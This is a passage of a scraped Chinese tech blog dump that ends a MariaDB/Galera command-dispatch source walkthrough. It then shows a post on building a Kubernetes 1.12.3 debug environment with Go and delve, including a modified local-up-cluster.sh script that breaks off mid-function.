statement from the client. */ statistic_increment(thd-&gt;status_var.questions, &amp;LOCK_status); if(!WSREP(thd)) thd-&gt;set_time(); /* Reset the query start time. */ parser_state.reset(beginning_of_next_stmt, length); /* TODO: set thd-&gt;lex-&gt;sql_command to SQLCOM_END here */ if (WSREP_ON) wsrep_mysql_parse(thd, beginning_of_next_stmt, length, &amp;parser_state); //执行wsrep_mysql_parse else mysql_parse(thd, beginning_of_next_stmt, length, &amp;parser_state); &#125; DBUG_PRINT(\"info\",(\"query ready\")); break; &#125; case COM_FIELD_LIST: // This isn't actually needed#ifdef DONT_ALLOW_SHOW_COMMANDS my_message(ER_NOT_ALLOWED_COMMAND, ER_THD(thd, ER_NOT_ALLOWED_COMMAND), MYF(0)); /* purecov: inspected */ break;#else &#123; char *fields, *packet_end= packet + packet_length, *arg_end; /* Locked closure of all tables */ TABLE_LIST table_list; LEX_STRING table_name; LEX_STRING db; /* SHOW statements should not add the used tables to the list of tables used in a transaction. */ MDL_savepoint mdl_savepoint= thd-&gt;mdl_context.mdl_savepoint(); status_var_increment(thd-&gt;status_var.com_stat[SQLCOM_SHOW_FIELDS]); if (thd-&gt;copy_db_to(&amp;db.str, &amp;db.length)) break; /* We have name + wildcard in packet, separated by endzero (The packet is guaranteed to end with an end zero) */ arg_end= strend(packet); uint arg_length= arg_end - packet; /* Check given table name length. */ if (packet_length - arg_length &gt; NAME_LEN + 1 || arg_length &gt; SAFE_NAME_LEN) &#123; my_message(ER_UNKNOWN_COM_ERROR, ER_THD(thd, ER_UNKNOWN_COM_ERROR), MYF(0)); break; &#125; thd-&gt;convert_string(&amp;table_name, system_charset_info, packet, arg_length, thd-&gt;charset()); if (check_table_name(table_name.str, table_name.length, FALSE)) &#123; /* this is OK due to convert_string() null-terminating the string */ my_error(ER_WRONG_TABLE_NAME, MYF(0), table_name.str); break; &#125; packet= arg_end + 1; thd-&gt;reset_for_next_command(); lex_start(thd); /* Must be before we init the table list. */ if (lower_case_table_names) &#123; table_name.length= my_casedn_str(files_charset_info, table_name.str); db.length= my_casedn_str(files_charset_info, db.str); &#125; table_list.init_one_table(db.str, db.length, table_name.str, table_name.length, table_name.str, TL_READ); /* Init TABLE_LIST members necessary when the undelrying table is view. */ table_list.select_lex= &amp;(thd-&gt;lex-&gt;select_lex); thd-&gt;lex-&gt; select_lex.table_list.link_in_list(&amp;table_list, &amp;table_list.next_local); thd-&gt;lex-&gt;add_to_query_tables(&amp;table_list); if (is_infoschema_db(table_list.db, table_list.db_length)) &#123; ST_SCHEMA_TABLE *schema_table= find_schema_table(thd, table_list.alias); if (schema_table) table_list.schema_table= schema_table; &#125; uint query_length= (uint) (packet_end - packet); // Don't count end \\0 if (!(fields= (char *) thd-&gt;memdup(packet, query_length + 1))) break; thd-&gt;set_query(fields, query_length); general_log_print(thd, command, \"%s %s\", table_list.table_name, fields); if (open_temporary_tables(thd, &amp;table_list)) break; if (check_table_access(thd, SELECT_ACL, &amp;table_list, TRUE, UINT_MAX, FALSE)) break; /* Turn on an optimization relevant if the underlying table is a view: do not fill derived tables. */ thd-&gt;lex-&gt;sql_command= SQLCOM_SHOW_FIELDS; mysqld_list_fields(thd,&amp;table_list,fields); thd-&gt;lex-&gt;unit.cleanup(); /* No need to rollback statement transaction, it's not started. */ DBUG_ASSERT(thd-&gt;transaction.stmt.is_empty()); close_thread_tables(thd); thd-&gt;mdl_context.rollback_to_savepoint(mdl_savepoint); if (thd-&gt;transaction_rollback_request) &#123; /* Transaction rollback was requested since MDL deadlock was discovered while trying to open tables. Rollback transaction in all storage engines including binary log and release all locks. */ trans_rollback_implicit(thd); thd-&gt;mdl_context.release_transactional_locks(); &#125; thd-&gt;cleanup_after_query(); break; &#125;#endif case COM_QUIT: /* We don't calculate statistics for this command */ general_log_print(thd, command, NullS); net-&gt;error=0; // Don't give 'abort' message thd-&gt;get_stmt_da()-&gt;disable_status(); // Don't send anything back error=TRUE; // End server break;#ifndef EMBEDDED_LIBRARY case COM_BINLOG_DUMP: &#123; ulong pos; ushort flags; uint32 slave_server_id; status_var_increment(thd-&gt;status_var.com_other); thd-&gt;enable_slow_log&amp;= opt_log_slow_admin_statements; thd-&gt;query_plan_flags|= QPLAN_ADMIN; if (check_global_access(thd, REPL_SLAVE_ACL)) break; /* TODO: The following has to be changed to an 8 byte integer */ pos = uint4korr(packet); flags = uint2korr(packet + 4); thd-&gt;variables.server_id=0; /* avoid suicide */ if ((slave_server_id= uint4korr(packet+6))) // mysqlbinlog.server_id==0 kill_zombie_dump_threads(slave_server_id); thd-&gt;variables.server_id = slave_server_id; general_log_print(thd, command, \"Log: '%s' Pos: %ld\", packet+10, (long) pos); mysql_binlog_send(thd, thd-&gt;strdup(packet + 10), (my_off_t) pos, flags); unregister_slave(thd,1,1); /* fake COM_QUIT -- if we get here, the thread needs to terminate */ error = TRUE; break; &#125;#endif case COM_REFRESH: &#123; int not_used; /* Initialize thd-&gt;lex since it's used in many base functions, such as open_tables(). Otherwise, it remains unitialized and may cause crash during execution of COM_REFRESH. */ lex_start(thd); status_var_increment(thd-&gt;status_var.com_stat[SQLCOM_FLUSH]); ulonglong options= (ulonglong) (uchar) packet[0]; if (trans_commit_implicit(thd)) break; thd-&gt;mdl_context.release_transactional_locks(); if (check_global_access(thd,RELOAD_ACL)) break; general_log_print(thd, command, NullS);#ifndef DBUG_OFF bool debug_simulate= FALSE; DBUG_EXECUTE_IF(\"simulate_detached_thread_refresh\", debug_simulate= TRUE;); if (debug_simulate) &#123; /* Simulate a reload without a attached thread session. Provides a environment similar to that of when the server receives a SIGHUP signal and reloads caches and flushes tables. */ bool res; set_current_thd(0); res= reload_acl_and_cache(NULL, options | REFRESH_FAST, NULL, &amp;not_used); set_current_thd(thd); if (res) break; &#125; else#endif &#123; thd-&gt;lex-&gt;relay_log_connection_name= empty_lex_str; if (reload_acl_and_cache(thd, options, (TABLE_LIST*) 0, &amp;not_used)) break; &#125; if (trans_commit_implicit(thd)) break; close_thread_tables(thd); thd-&gt;mdl_context.release_transactional_locks(); my_ok(thd); break; &#125;#ifndef EMBEDDED_LIBRARY case COM_SHUTDOWN: &#123; status_var_increment(thd-&gt;status_var.com_other); if (check_global_access(thd,SHUTDOWN_ACL)) break; /* purecov: inspected */ /* If the client is &lt; 4.1.3, it is going to send us no argument; then packet_length is 0, packet[0] is the end 0 of the packet. Note that SHUTDOWN_DEFAULT is 0. If client is &gt;= 4.1.3, the shutdown level is in packet[0]. */ enum mysql_enum_shutdown_level level; level= (enum mysql_enum_shutdown_level) (uchar) packet[0]; if (level == SHUTDOWN_DEFAULT) level= SHUTDOWN_WAIT_ALL_BUFFERS; // soon default will be configurable else if (level != SHUTDOWN_WAIT_ALL_BUFFERS) &#123; my_error(ER_NOT_SUPPORTED_YET, MYF(0), \"this shutdown level\"); break; &#125; DBUG_PRINT(\"quit\",(\"Got shutdown command for level %u\", level)); general_log_print(thd, command, NullS); my_eof(thd); kill_mysql(); error=TRUE; break; &#125;#endif case COM_STATISTICS: &#123; STATUS_VAR *current_global_status_var; // Big; Don't allocate on stack ulong uptime; uint length __attribute__((unused)); ulonglong queries_per_second1000; char buff[250]; uint buff_len= sizeof(buff); if (!(current_global_status_var= (STATUS_VAR*) thd-&gt;alloc(sizeof(STATUS_VAR)))) break; general_log_print(thd, command, NullS); status_var_increment(thd-&gt;status_var.com_stat[SQLCOM_SHOW_STATUS]); calc_sum_of_all_status(current_global_status_var); if (!(uptime= (ulong) (thd-&gt;start_time - server_start_time))) queries_per_second1000= 0; else queries_per_second1000= thd-&gt;query_id * 1000 / uptime; length= my_snprintf(buff, buff_len - 1, \"Uptime: %lu Threads: %d Questions: %lu \" \"Slow queries: %lu Opens: %lu Flush tables: %lu \" \"Open tables: %u Queries per second avg: %u.%03u\", uptime, (int) thread_count, (ulong) thd-&gt;query_id, current_global_status_var-&gt;long_query_count, current_global_status_var-&gt;opened_tables, tdc_refresh_version(), tc_records(), (uint) (queries_per_second1000 / 1000), (uint) (queries_per_second1000 % 1000));#ifdef EMBEDDED_LIBRARY /* Store the buffer in permanent memory */ my_ok(thd, 0, 0, buff);#else (void) my_net_write(net, (uchar*) buff, length); (void) net_flush(net); thd-&gt;get_stmt_da()-&gt;disable_status();#endif break; &#125; case COM_PING: status_var_increment(thd-&gt;status_var.com_other); my_ok(thd); // Tell client we are alive break; case COM_PROCESS_INFO: status_var_increment(thd-&gt;status_var.com_stat[SQLCOM_SHOW_PROCESSLIST]); if (!thd-&gt;security_ctx-&gt;priv_user[0] &amp;&amp; check_global_access(thd, PROCESS_ACL)) break; general_log_print(thd, command, NullS); mysqld_list_processes(thd, thd-&gt;security_ctx-&gt;master_access &amp; PROCESS_ACL ? NullS : thd-&gt;security_ctx-&gt;priv_user, 0); break; case COM_PROCESS_KILL: &#123; status_var_increment(thd-&gt;status_var.com_stat[SQLCOM_KILL]); ulong id=(ulong) uint4korr(packet); sql_kill(thd, id, KILL_CONNECTION_HARD, KILL_TYPE_ID); break; &#125; case COM_SET_OPTION: &#123; status_var_increment(thd-&gt;status_var.com_stat[SQLCOM_SET_OPTION]); uint opt_command= uint2korr(packet); switch (opt_command) &#123; case (int) MYSQL_OPTION_MULTI_STATEMENTS_ON: thd-&gt;client_capabilities|= CLIENT_MULTI_STATEMENTS; my_eof(thd); break; case (int) MYSQL_OPTION_MULTI_STATEMENTS_OFF: thd-&gt;client_capabilities&amp;= ~CLIENT_MULTI_STATEMENTS; my_eof(thd); break; default: my_message(ER_UNKNOWN_COM_ERROR, ER_THD(thd, ER_UNKNOWN_COM_ERROR), MYF(0)); break; &#125; break; &#125; case COM_DEBUG: status_var_increment(thd-&gt;status_var.com_other); if (check_global_access(thd, SUPER_ACL)) break; /* purecov: inspected */ mysql_print_status(); general_log_print(thd, command, NullS); my_eof(thd); break; case COM_SLEEP: case COM_CONNECT: // Impossible here case COM_TIME: // Impossible from client case COM_DELAYED_INSERT: case COM_END: default: my_message(ER_UNKNOWN_COM_ERROR, ER_THD(thd, ER_UNKNOWN_COM_ERROR), MYF(0)); break; &#125;#ifdef WITH_WSREP dispatch_end: if (WSREP(thd)) &#123; /* wsrep BF abort in query exec phase */ mysql_mutex_lock(&amp;thd-&gt;LOCK_wsrep_thd); do_end_of_statement= thd-&gt;wsrep_conflict_state != REPLAYING &amp;&amp; thd-&gt;wsrep_conflict_state != RETRY_AUTOCOMMIT; mysql_mutex_unlock(&amp;thd-&gt;LOCK_wsrep_thd); &#125; else do_end_of_statement= true;#endif /* WITH_WSREP */ if (do_end_of_statement) &#123; DBUG_ASSERT(thd-&gt;derived_tables == NULL &amp;&amp; (thd-&gt;open_tables == NULL || (thd-&gt;locked_tables_mode == LTM_LOCK_TABLES))); thd_proc_info(thd, \"updating status\"); /* Finalize server status flags after executing a command. */ thd-&gt;update_server_status(); thd-&gt;protocol-&gt;end_statement(); query_cache_end_of_result(thd); &#125; if (!thd-&gt;is_error() &amp;&amp; !thd-&gt;killed_errno()) mysql_audit_general(thd, MYSQL_AUDIT_GENERAL_RESULT, 0, 0); mysql_audit_general(thd, MYSQL_AUDIT_GENERAL_STATUS, thd-&gt;get_stmt_da()-&gt;is_error() ? thd-&gt;get_stmt_da()-&gt;sql_errno() : 0, command_name[command].str); thd-&gt;update_all_stats(); log_slow_statement(thd); THD_STAGE_INFO(thd, stage_cleaning_up); thd-&gt;reset_query(); thd-&gt;set_examined_row_count(0); // For processlist thd-&gt;set_command(COM_SLEEP); /* Performance Schema Interface instrumentation, end */ MYSQL_END_STATEMENT(thd-&gt;m_statement_psi, thd-&gt;get_stmt_da()); thd-&gt;m_statement_psi= NULL; thd-&gt;m_digest= NULL; dec_thread_running(); thd-&gt;packet.shrink(thd-&gt;variables.net_buffer_length); // Reclaim some memory free_root(thd-&gt;mem_root,MYF(MY_KEEP_PREALLOC));#if defined(ENABLED_PROFILING) thd-&gt;profiling.finish_current_query();#endif if (MYSQL_QUERY_DONE_ENABLED() || MYSQL_COMMAND_DONE_ENABLED()) &#123; int res __attribute__((unused)); res= (int) thd-&gt;is_error(); if (command == COM_QUERY) &#123; MYSQL_QUERY_DONE(res); &#125; MYSQL_COMMAND_DONE(res); &#125; DEBUG_SYNC(thd,\"dispatch_command_end\"); /* Check that some variables are reset properly */ DBUG_ASSERT(thd-&gt;abort_on_warning == 0); thd-&gt;lex-&gt;restore_set_statement_var(); DBUG_RETURN(error);&#125; 上面查询语句的时候，在mysql_parse函数之前做了检查。 未完待续","categories":[{"name":"mysql","slug":"mysql","permalink":"http://www.yorzorzy.xyz/categories/mysql/"}],"tags":[{"name":"galera","slug":"galera","permalink":"http://www.yorzorzy.xyz/tags/galera/"}]},{"title":"kubernetes debug环境搭建","slug":"kubernetes_debug环境搭建","date":"2020-03-02T10:25:56.103Z","updated":"2020-03-02T10:25:02.000Z","comments":true,"path":"2020/03/02/kubernetes_debug环境搭建/","link":"","permalink":"http://www.yorzorzy.xyz/2020/03/02/kubernetes_debug%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"","text":"kubernetes debug环境搭建k8s debug环境搭建 环境安装：go 1.12版本，1.13版本太高，k8s编译有点问题。 k8s 1.12.3版本 centos 7安装 k8s，进行调试，使用dlv进行调试 安装必须要的组件： 12yum install -y docker wget curl vim golang etcd openssl gitsystemctl enable docker &amp;&amp; systemctl start docker 设置gopath路径，之后安装好必须要的库 1go get -u -v github.com/cloudflare/cfssl/cmd/... 安装delve调试工具 1go get -u -v github.com/derekparker/delve/cmd/dlv 1git clone https://github.com/kubernetes/kubernetes.git $GOPATH/src/k8s.io/kubernetes 1git checkout -b v1.12.3 运行脚本安装和运行 12cp hack/local-up-cluster.sh hack/local-up-cluster.sh.baktouch hack/local-up-cluster.sh &amp;&amp; chmod +x hack/local-up-cluster.sh 使用下面脚本安装和运行 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837838839840841842843844845846847848849850851852853854855856857858859860861862863864865866867868869870871872873874875876877878879880881882883884885886887888889890891892893894895896897898899900901902903904905906907908909910911912913914915916917918919920921922923924#!/bin/bash# Copyright 2014 The Kubernetes Authors.## Licensed under the Apache License, Version 2.0 (the \"License\");# you may not use this file except in compliance with the License.# You may obtain a copy of the License at## http://www.apache.org/licenses/LICENSE-2.0## Unless required by applicable law or agreed to in writing, software# distributed under the License is distributed on an \"AS IS\" BASIS,# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.# See the License for the specific language governing permissions and# limitations under the License.set -xKUBE_ROOT=$(dirname \"$&#123;BASH_SOURCE&#125;\")/..# This command builds and runs a local kubernetes cluster.# You may need to run this as root to allow kubelet to open docker's socket,# and to write the test CA in /var/run/kubernetes.DOCKER_OPTS=$&#123;DOCKER_OPTS:-\"\"&#125;DOCKER=(docker $&#123;DOCKER_OPTS&#125;)DOCKERIZE_KUBELET=$&#123;DOCKERIZE_KUBELET:-\"\"&#125;ALLOW_PRIVILEGED=$&#123;ALLOW_PRIVILEGED:-\"\"&#125;DENY_SECURITY_CONTEXT_ADMISSION=$&#123;DENY_SECURITY_CONTEXT_ADMISSION:-\"\"&#125;PSP_ADMISSION=$&#123;PSP_ADMISSION:-\"\"&#125;NODE_ADMISSION=$&#123;NODE_ADMISSION:-\"\"&#125;RUNTIME_CONFIG=$&#123;RUNTIME_CONFIG:-\"\"&#125;KUBELET_AUTHORIZATION_WEBHOOK=$&#123;KUBELET_AUTHORIZATION_WEBHOOK:-\"\"&#125;KUBELET_AUTHENTICATION_WEBHOOK=$&#123;KUBELET_AUTHENTICATION_WEBHOOK:-\"\"&#125;POD_MANIFEST_PATH=$&#123;POD_MANIFEST_PATH:-\"/var/run/kubernetes/static-pods\"&#125;KUBELET_FLAGS=$&#123;KUBELET_FLAGS:-\"\"&#125;# many dev environments run with swap on, so we don't fail in this envFAIL_SWAP_ON=$&#123;FAIL_SWAP_ON:-\"false\"&#125;# Name of the network plugin, eg: \"kubenet\"NET_PLUGIN=$&#123;NET_PLUGIN:-\"\"&#125;# Place the config files and binaries required by NET_PLUGIN in these directory,# eg: \"/etc/cni/net.d\" for config files, and \"/opt/cni/bin\" for binaries.CNI_CONF_DIR=$&#123;CNI_CONF_DIR:-\"\"&#125;CNI_BIN_DIR=$&#123;CNI_BIN_DIR:-\"\"&#125;SERVICE_CLUSTER_IP_RANGE=$&#123;SERVICE_CLUSTER_IP_RANGE:-10.0.0.0/24&#125;FIRST_SERVICE_CLUSTER_IP=$&#123;FIRST_SERVICE_CLUSTER_IP:-10.0.0.1&#125;# if enabled, must set CGROUP_ROOTCGROUPS_PER_QOS=$&#123;CGROUPS_PER_QOS:-true&#125;# name of the cgroup driver, i.e. cgroupfs or systemdCGROUP_DRIVER=$&#123;CGROUP_DRIVER:-\"\"&#125;# owner of client certs, default to current user if not specifiedUSER=$&#123;USER:-$(whoami)&#125;# enables testing eviction scenarios locally.EVICTION_HARD=$&#123;EVICTION_HARD:-\"memory.available&lt;100Mi,nodefs.available&lt;10%,nodefs.inodesFree&lt;5%\"&#125;EVICTION_SOFT=$&#123;EVICTION_SOFT:-\"\"&#125;EVICTION_PRESSURE_TRANSITION_PERIOD=$&#123;EVICTION_PRESSURE_TRANSITION_PERIOD:-\"1m\"&#125;# This script uses docker0 (or whatever container bridge docker is currently using)# and we don't know the IP of the DNS pod to pass in as --cluster-dns.# To set this up by hand, set this flag and change DNS_SERVER_IP.# Note also that you need API_HOST (defined above) for correct DNS.KUBE_PROXY_MODE=$&#123;KUBE_PROXY_MODE:-\"\"&#125;ENABLE_CLUSTER_DNS=$&#123;KUBE_ENABLE_CLUSTER_DNS:-true&#125;DNS_SERVER_IP=$&#123;KUBE_DNS_SERVER_IP:-10.0.0.10&#125;DNS_DOMAIN=$&#123;KUBE_DNS_NAME:-\"cluster.local\"&#125;KUBECTL=$&#123;KUBECTL:-cluster/kubectl.sh&#125;WAIT_FOR_URL_API_SERVER=$&#123;WAIT_FOR_URL_API_SERVER:-60&#125;ENABLE_DAEMON=$&#123;ENABLE_DAEMON:-false&#125;HOSTNAME_OVERRIDE=$&#123;HOSTNAME_OVERRIDE:-\"127.0.0.1\"&#125;EXTERNAL_CLOUD_PROVIDER=$&#123;EXTERNAL_CLOUD_PROVIDER:-false&#125;EXTERNAL_CLOUD_PROVIDER_BINARY=$&#123;EXTERNAL_CLOUD_PROVIDER_BINARY:-\"\"&#125;CLOUD_PROVIDER=$&#123;CLOUD_PROVIDER:-\"\"&#125;CLOUD_CONFIG=$&#123;CLOUD_CONFIG:-\"\"&#125;FEATURE_GATES=$&#123;FEATURE_GATES:-\"AllAlpha=false\"&#125;STORAGE_BACKEND=$&#123;STORAGE_BACKEND:-\"etcd3\"&#125;# enable swagger uiENABLE_SWAGGER_UI=$&#123;ENABLE_SWAGGER_UI:-false&#125;# enable Pod priority and preemptionENABLE_POD_PRIORITY_PREEMPTION=$&#123;ENABLE_POD_PRIORITY_PREEMPTION:-\"\"&#125;# enable kubernetes dashboardENABLE_CLUSTER_DASHBOARD=$&#123;KUBE_ENABLE_CLUSTER_DASHBOARD:-false&#125;# enable audit logENABLE_APISERVER_BASIC_AUDIT=$&#123;ENABLE_APISERVER_BASIC_AUDIT:-false&#125;# RBAC Mode optionsAUTHORIZATION_MODE=$&#123;AUTHORIZATION_MODE:-\"Node,RBAC\"&#125;KUBECONFIG_TOKEN=$&#123;KUBECONFIG_TOKEN:-\"\"&#125;AUTH_ARGS=$&#123;AUTH_ARGS:-\"\"&#125;# Install a default storage class (enabled by default)DEFAULT_STORAGE_CLASS=$&#123;KUBE_DEFAULT_STORAGE_CLASS:-true&#125;# start the cache mutation detector by default so that cache mutators will be foundKUBE_CACHE_MUTATION_DETECTOR=\"$&#123;KUBE_CACHE_MUTATION_DETECTOR:-true&#125;\"export KUBE_CACHE_MUTATION_DETECTOR# panic the server on watch decode errors since they are considered coder mistakesKUBE_PANIC_WATCH_DECODE_ERROR=\"$&#123;KUBE_PANIC_WATCH_DECODE_ERROR:-true&#125;\"export KUBE_PANIC_WATCH_DECODE_ERRORENABLE_ADMISSION_PLUGINS=$&#123;ENABLE_ADMISSION_PLUGINS:-\"\"&#125;DISABLE_ADMISSION_PLUGINS=$&#123;DISABLE_ADMISSION_PLUGINS:-\"\"&#125;ADMISSION_CONTROL_CONFIG_FILE=$&#123;ADMISSION_CONTROL_CONFIG_FILE:-\"\"&#125;# START_MODE can be 'all', 'kubeletonly', or 'nokubelet'START_MODE=$&#123;START_MODE:-\"all\"&#125;# A list of controllers to enableKUBE_CONTROLLERS=\"$&#123;KUBE_CONTROLLERS:-\"*\"&#125;\"# sanity check for OpenStack providerif [ \"$&#123;CLOUD_PROVIDER&#125;\" == \"openstack\" ]; then if [ \"$&#123;CLOUD_CONFIG&#125;\" == \"\" ]; then echo \"Missing CLOUD_CONFIG env for OpenStack provider!\" exit 1 fi if [ ! -f \"$&#123;CLOUD_CONFIG&#125;\" ]; then echo \"Cloud config $&#123;CLOUD_CONFIG&#125; doesn't exist\" exit 1 fifi# set feature gates if using ipvs modeif [ \"$&#123;KUBE_PROXY_MODE&#125;\" == \"ipvs\" ]; then # If required kernel modules are not available, fall back to iptables. sudo modprobe -a ip_vs ip_vs_rr ip_vs_wrr ip_vs_sh nf_conntrack_ipv4 if [[ $? -eq 0 ]]; then FEATURE_GATES=\"$&#123;FEATURE_GATES&#125;,SupportIPVSProxyMode=true\" else echo \"Required kernel modules for ipvs not found. Falling back to iptables mode.\" KUBE_PROXY_MODE=iptables fifi# set feature gates if enable Pod priority and preemptionif [ \"$&#123;ENABLE_POD_PRIORITY_PREEMPTION&#125;\" == true ]; then FEATURE_GATES=\"$FEATURE_GATES,PodPriority=true\"fi# warn if users are running with swap allowedif [ \"$&#123;FAIL_SWAP_ON&#125;\" == \"false\" ]; then echo \"WARNING : The kubelet is configured to not fail if swap is enabled; production deployments should disable swap.\"fiif [ \"$(id -u)\" != \"0\" ]; then echo \"WARNING : This script MAY be run as root for docker socket / iptables functionality; if failures occur, retry as root.\" 2&gt;&amp;1fi# Stop right away if the build failsset -esource \"$&#123;KUBE_ROOT&#125;/hack/lib/init.sh\"function usage &#123; echo \"This script starts a local kube cluster. \" echo \"Example 0: hack/local-up-cluster.sh -h (this 'help' usage description)\" echo \"Example 1: hack/local-up-cluster.sh -o _output/dockerized/bin/linux/amd64/ (run from docker output)\" echo \"Example 2: hack/local-up-cluster.sh -O (auto-guess the bin path for your platform)\" echo \"Example 3: hack/local-up-cluster.sh (build a local copy of the source)\"&#125;# This function guesses where the existing cached binary build is for the `-O`# flagfunction guess_built_binary_path &#123; #local hyperkube_path=$(kube::util::find-binary \"hyperkube\") local hyperkube_path=$(kube::util::find-binary \"kube-apiserver\") if [[ -z \"$&#123;hyperkube_path&#125;\" ]]; then return fi echo -n \"$(dirname \"$&#123;hyperkube_path&#125;\")\"&#125;### Allow user to supply the source directory.GO_OUT=$&#123;GO_OUT:-&#125;while getopts \"ho:O\" OPTIONdo case $OPTION in o) echo \"skipping build\" GO_OUT=\"$OPTARG\" echo \"using source $GO_OUT\" ;; O) GO_OUT=$(guess_built_binary_path) if [ \"$GO_OUT\" == \"\" ]; then echo \"Could not guess the correct output directory to use.\" exit 1 fi ;; h) usage exit ;; ?) usage exit ;; esacdoneif [ \"x$GO_OUT\" == \"x\" ]; then #make -C \"$&#123;KUBE_ROOT&#125;\" WHAT=\"cmd/kubectl cmd/hyperkube\" make -C \"$&#123;KUBE_ROOT&#125;\" GOGCFLAGS=\"-N -l\" WHAT=\"cmd/kubectl cmd/kube-proxy cmd/kube-apiserver cmd/kube-controller-manager cmd/cloud-controller-manager cmd/kube-scheduler cmd/kubelet\"else echo \"skipped the build.\"fifunction test_rkt &#123; if [[ -n \"$&#123;RKT_PATH&#125;\" ]]; then $&#123;RKT_PATH&#125; list 2&gt; /dev/null 1&gt; /dev/null if [ \"$?\" != \"0\" ]; then echo \"Failed to successfully run 'rkt list', please verify that $&#123;RKT_PATH&#125; is the path of rkt binary.\" exit 1 fi else rkt list 2&gt; /dev/null 1&gt; /dev/null if [ \"$?\" != \"0\" ]; then echo \"Failed to successfully run 'rkt list', please verify that rkt is in \\$PATH.\" exit 1 fi fi&#125;# Shut down anyway if there's an error.set +eAPI_PORT=$&#123;API_PORT:-8080&#125;API_SECURE_PORT=$&#123;API_SECURE_PORT:-6443&#125;# WARNING: For DNS to work on most setups you should export API_HOST as the docker0 ip address,API_HOST=$&#123;API_HOST:-localhost&#125;API_HOST_IP=$&#123;API_HOST_IP:-\"127.0.0.1\"&#125;ADVERTISE_ADDRESS=$&#123;ADVERTISE_ADDRESS:-\"\"&#125;API_BIND_ADDR=$&#123;API_BIND_ADDR:-\"0.0.0.0\"&#125;EXTERNAL_HOSTNAME=$&#123;EXTERNAL_HOSTNAME:-localhost&#125;KUBELET_HOST=$&#123;KUBELET_HOST:-\"127.0.0.1\"&#125;# By default only allow CORS for requests on localhostAPI_CORS_ALLOWED_ORIGINS=$&#123;API_CORS_ALLOWED_ORIGINS:-/127.0.0.1(:[0-9]+)?$,/localhost(:[0-9]+)?$&#125;KUBELET_PORT=$&#123;KUBELET_PORT:-10250&#125;LOG_LEVEL=$&#123;LOG_LEVEL:-3&#125;# Use to increase verbosity on particular files, e.g. LOG_SPEC=token_controller*=5,other_controller*=4LOG_SPEC=$&#123;LOG_SPEC:-\"\"&#125;LOG_DIR=$&#123;LOG_DIR:-\"/tmp\"&#125;CONTAINER_RUNTIME=$&#123;CONTAINER_RUNTIME:-\"docker\"&#125;CONTAINER_RUNTIME_ENDPOINT=$&#123;CONTAINER_RUNTIME_ENDPOINT:-\"\"&#125;IMAGE_SERVICE_ENDPOINT=$&#123;IMAGE_SERVICE_ENDPOINT:-\"\"&#125;RKT_PATH=$&#123;RKT_PATH:-\"\"&#125;RKT_STAGE1_IMAGE=$&#123;RKT_STAGE1_IMAGE:-\"\"&#125;CHAOS_CHANCE=$&#123;CHAOS_CHANCE:-0.0&#125;CPU_CFS_QUOTA=$&#123;CPU_CFS_QUOTA:-true&#125;ENABLE_HOSTPATH_PROVISIONER=$&#123;ENABLE_HOSTPATH_PROVISIONER:-\"false\"&#125;CLAIM_BINDER_SYNC_PERIOD=$&#123;CLAIM_BINDER_SYNC_PERIOD:-\"15s\"&#125; # current k8s defaultENABLE_CONTROLLER_ATTACH_DETACH=$&#123;ENABLE_CONTROLLER_ATTACH_DETACH:-\"true\"&#125; # current defaultKEEP_TERMINATED_POD_VOLUMES=$&#123;KEEP_TERMINATED_POD_VOLUMES:-\"true\"&#125;# This is the default dir and filename where the apiserver will generate a self-signed cert# which should be able to be used as the CA to verify itselfCERT_DIR=$&#123;CERT_DIR:-\"/var/run/kubernetes\"&#125;ROOT_CA_FILE=$&#123;CERT_DIR&#125;/server-ca.crtROOT_CA_KEY=$&#123;CERT_DIR&#125;/server-ca.keyCLUSTER_SIGNING_CERT_FILE=$&#123;CLUSTER_SIGNING_CERT_FILE:-\"$&#123;ROOT_CA_FILE&#125;\"&#125;CLUSTER_SIGNING_KEY_FILE=$&#123;CLUSTER_SIGNING_KEY_FILE:-\"$&#123;ROOT_CA_KEY&#125;\"&#125;# name of the cgroup driver, i.e. cgroupfs or systemdif [[ $&#123;CONTAINER_RUNTIME&#125; == \"docker\" ]]; then # default cgroup driver to match what is reported by docker to simplify local development if [[ -z $&#123;CGROUP_DRIVER&#125; ]]; then # match driver with docker runtime reported value (they must match) CGROUP_DRIVER=$(docker info | grep \"Cgroup Driver:\" | cut -f3- -d' ') echo \"Kubelet cgroup driver defaulted to use: $&#123;CGROUP_DRIVER&#125;\" fifi# Ensure CERT_DIR is created for auto-generated crt/key and kubeconfigmkdir -p \"$&#123;CERT_DIR&#125;\" &amp;&gt;/dev/null || sudo mkdir -p \"$&#123;CERT_DIR&#125;\"CONTROLPLANE_SUDO=$(test -w \"$&#123;CERT_DIR&#125;\" || echo \"sudo -E\")function test_apiserver_off &#123; # For the common local scenario, fail fast if server is already running. # this can happen if you run local-up-cluster.sh twice and kill etcd in between. if [[ \"$&#123;API_PORT&#125;\" -gt \"0\" ]]; then curl --silent -g $API_HOST:$API_PORT if [ ! $? -eq 0 ]; then echo \"API SERVER insecure port 